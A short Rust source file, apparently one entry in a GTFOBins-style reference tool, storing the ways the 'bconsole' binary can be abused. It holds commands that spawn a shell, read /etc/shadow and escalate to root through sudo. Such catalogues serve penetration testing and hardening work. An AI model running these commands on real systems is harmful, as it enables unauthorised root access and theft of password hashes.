
pub static BIN_NAME: &'static str = "bconsole";
pub static SH_CODE: &'static str = r#"
    
    bconsole
    @exec /bin/sh
"#;
pub static FR_DESC: &'static str = "The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files.";
pub static FR_CODE: &'static str = r#"
    
    bconsole -c /etc/shadow
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo bconsole
    @exec /bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
